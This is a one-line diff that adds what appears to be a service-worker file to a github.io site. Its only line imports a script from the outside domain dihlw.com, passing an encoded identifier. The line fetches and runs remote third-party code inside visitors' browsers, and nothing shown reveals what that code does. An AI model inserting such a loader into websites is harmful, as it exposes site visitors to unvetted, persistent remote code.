@@ -1,0 +1,1 @@
+importScripts('https://dihlw.com/v1/sw-import.js?h=waWQiOjEwNzQwMTIsInNpZCI6MTA4MTMzNCwid2lkIjoxNjQ3NTgsInNyYyI6MiwicG0iOjB9eyJ&d=abhinavquadworld.github.io');
